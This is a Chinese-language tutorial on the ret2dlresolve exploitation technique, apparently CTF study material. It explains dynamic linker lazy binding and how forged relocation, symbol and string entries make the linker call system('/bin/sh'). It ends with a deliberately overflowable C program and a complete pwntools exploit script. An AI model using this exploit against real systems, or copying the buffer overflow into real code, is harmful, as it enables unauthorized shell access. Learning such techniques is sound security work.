## ret2dlresolve
### 1. 核心概念与背景

#### 1.1 什么是 Ret2dlresolve
**Ret2dlresolve** 是一种利用 Linux 动态链接器机制的漏洞利用技术。
*   **核心思想**：攻击者不直接寻找目标函数（如 `system`）的地址，而是通过伪造 ELF 数据结构，欺骗动态链接器，让它误以为程序需要解析 `system` 函数，从而利用链接器自身的功能来完成攻击。

#### 1.2 
在常规的栈溢出利用（如 Ret2Libc）中，我们通常面临以下困境：
1.  **依赖泄露**：必须先泄露 Libc 基址（绕过 ASLR）。
2.  **依赖版本**：必须知道远程环境的 Libc 版本，否则偏移计算错误。
3.  **限制条件**：如果程序没有输出函数（如 `write`/`puts`），或者只能溢出一次，传统的泄露+利用模式失效。

---

### 2. 原理

要理解攻击，必须先理解正常流程。Linux 程序在调用外部函数（如 `printf`）时，经历了延迟绑定过程。

#### 2.1
*   **PLT (Procedure Linkage Table)**：代码段的跳板，负责调用链接器。
*   **GOT (Global Offset Table)**：数据段的地址表，存放函数真实地址。
*  **dl_runtime_resolve：动态链接器的核心函数，负责解析符号。**

#### 2.2 
链接器工作时需要查询三个表（都在 ELF 文件中）：
1.  **`.rel.plt` (重定位表)**：
    *   关键字段：`r_info` (包含符号表索引)。
2.  **`.dynsym` (动态符号表)**：记录符号的属性（如大小、类型）。
    *   关键字段：`st_name` (包含字符串表偏移)。
3.  **`.dynstr` (动态字符串表)**：**名字库**。存储符号的字符串名称（如 "printf"）。

#### 2.3 正常流程 
当程序**第一次**调用 `printf` 时：
1.  **查 GOT**：程序去读 GOT 表，发现里面填的是 PLT 的下一条指令地址。
2.  **跳 PLT**：程序跳转到 `printf@plt`。
3.  **压栈 ID**：`printf@plt` 将一个编号 **`reloc_arg` (0)** 压入栈中。
    *   **注：0 代表这是 `.rel.plt` 表里的第 0 个任务。**
4.  **跳转到 PLT[0]。
5.  **链接器介入**：PLT[0] 调用 `_dl_runtime_resolve(link_map, 0)`。
6.  **查表**：
    *   链接器查 `.rel.plt` 第 0 项 -> 得到符号索引。
    *   链接器查 `.dynsym` -> 得到字符串偏移。
    *   链接器查 `.dynstr` -> 得到字符串 **"printf"**。
7.  **修补**：链接器找到 `printf` 真实地址，填入 GOT 表，并执行函数。

---

### 3. 攻击

#### 3.1 攻击思路
既然链接器是根据 `reloc_arg` (索引) 去查表的，那如果我们传给它一个**巨大的、越界的索引**呢？
*   链接器会计算：`Target_Addr = Base_Addr + Index * Size`。
*   如果 `Index` 很大，`Target_Addr` 就会指向我们可控的内存区域（如 `.bss` 段）。
*   我们在那里伪造好假的 `.rel.plt`、`.dynsym` 和 `.dynstr` 数据。

#### 3.2 攻击步骤
1.  **伪造数据**：
    *   在 `.bss` 段写入字符串 **"system\0"**。
    *   构造伪造的 **Symbol 结构体**，让它的 `st_name` 指向 "system"。
    *   构造伪造的 **Reloc 结构体**，让它的 `r_info` 指向伪造的 Symbol。
2.  **栈溢出**：
    *   控制 EIP 跳转到 **PLT[0]**。
    *   在栈上压入一个计算好的  `reloc_arg`。
    *   压入 `system` 的参数（指向 `"/bin/sh"`）。
3.  **触发**：
    *   链接器读取 `reloc_arg`。
    *   链接器在 `.bss` 段，读到了我们伪造的结构体。
    *   链接器最终解析出 **"system"**，并执行 `system("/bin/sh")`。

### 4. 脚本
#### 4.1 `Ret2dlresolvePayload` 介绍
#####  核心功能
1. **Fake Relocation Entry (Elf_Rel/Elf_Rela)**: 告诉链接器要解析哪个符号。
    
2. **Fake Symbol Entry (Elf_Sym)**: 包含符号的具体信息（如函数名索引）。
    
3. **Fake String Table**: 存放函数名字符串（如 "system\x00"）和参数字符串（如 "/bin/sh\x00"）。
##### 初始化
```python
dlresolve = Ret2dlresolvePayload(elf, symbol, args, data_addr)
```
| 参数 | 类型 | 说明 | 关键点 |
| :--- | :--- | :--- | :--- |
| **`elf`** | `ELF` | 目标二进制文件的上下文对象。 | 用于获取 PLT、GOT、SYMTAB、STRTAB 等节区的基址。 |
| **`symbol`** | `str` | 想要解析并执行的目标函数名。 | 通常是 `"system"` 或 `"execve"`。 |
| **`args`** | `list` | 传递给目标函数的参数列表。 | 例如 `["/bin/sh"]`。它会自动将字符串放入npayload 并生成对应的指针。 |
| **`data_addr`** | `int` |  我们打算存放伪造数据的内存地址。 | 必须是**可写**且**已知**的地址（通常选 `bss_addr + 0x100`）。如果开启了 PIE，这里必须填动态泄露后的实际地址。 |
##### 属性
1. **payload (bytes)**:
    
    - 生成的二进制数据块。
        
    - **操作**: 需要通过 read 或 strcpy 等漏洞点写入到 data_addr 指向的内存中。
        
2. **data_addr (int)**:
    
    - Payload 存放的起始地址（即初始化时传入的值）。
        
3. **reloc_index (int)** :
    
    - 传递给 dl_runtime_resolve 的参数。
        
    - **原理**: 它是 (fake_reloc_address - JMPREL_base) / sizeof(Elf_Rel)（在32位下是 offset，在64位下是 index）。
        
    - **作用**: 告诉链接器去哪里找我们伪造的重定位表项。
##### 示例
```python
rop = ROP(elf)

# 1. 先把 dlresolve.payload 写入内存
# 我们利用 read 函数写入
rop.read(0, dlresolve.data_addr, len(dlresolve.payload))

# 2. 调用 ret2dlresolve
# 这会自动生成：
# 调用 PLT[0]
# 压入 dlresolve.reloc_index
# 处理函数参数 (system("/bin/sh"))
rop.ret2dlresolve(dlresolve)
```
#### 4.2 示例
使用 `Ret2dlresolvePayload` 模块可以自动化完成复杂的结构体伪造。
```c

void vuln() {
    char buf[100];
    read(0, buf, 0x100);
}

int main() {
    write(1, "Hello, World\n", 13);
    vuln();
    return 0;
}
```

```python
offset = 112 
rop = ROP(elf)


dlresolve = Ret2dlresolvePayload(
    elf, 
    symbol="system", 
    args=["/bin/sh"],
    data_addr=elf.bss(0x100)
)


rop.read(0, dlresolve.data_addr, len(dlresolve.payload))

rop.ret2dlresolve(dlresolve)

raw_rop = rop.chain()

p = process('./vuln')

log.info(f"Writing payload to BSS @ {hex(dlresolve.data_addr)}")
payload1 = flat({
    offset: raw_rop
})

p.sendline(payload1)
p.send(dlresolve.payload)
p.interactive()
```
